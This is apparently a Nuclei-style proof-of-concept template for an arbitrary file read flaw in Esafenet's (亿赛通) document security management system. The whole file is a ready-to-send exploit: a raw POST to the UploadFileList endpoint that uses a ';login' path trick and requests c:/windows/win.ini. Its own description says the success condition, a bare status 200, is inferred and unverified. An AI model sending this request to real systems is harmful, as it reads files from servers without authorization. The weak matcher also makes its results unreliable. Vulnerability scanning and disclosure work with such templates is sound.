id: poc-2bfbc21dc95b2b9023ad
info:
  name: 亿赛通电子文档安全管理系统UploadFileList存在任意文件读取漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,lfi,2025
http:
- raw:
  - 'POST /CDGServer3/document/UploadFileList;login HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36

    Accept: */*

    Accept-Encoding: gzip

    Content-Type: application/x-www-form-urlencoded

    Content-Length: 68


    command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=111'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
